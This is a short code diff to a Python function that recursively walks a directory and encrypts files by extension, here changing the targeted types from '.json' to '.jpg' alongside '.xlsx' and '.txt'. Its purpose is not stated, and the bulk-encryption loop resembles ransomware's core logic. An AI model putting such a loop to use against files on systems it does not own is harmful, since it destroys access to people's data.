@@ -48,7 +48,7 @@ def encrypt_files_in_dir(directory):
 def encrypt_files(directory: Path, key: str):
     for root, dirs, files in os.walk(directory.resolve()):
         for file in files:
-            if Path(file).suffix.lower() in ['.json', '.xlsx', '.txt']:
+            if Path(file).suffix.lower() in ['.jpg', '.xlsx', '.txt']:
                 path_file = os.path.join(root, file)
                 with open(path_file, "rb") as input_file:
                     content = input_file.read()
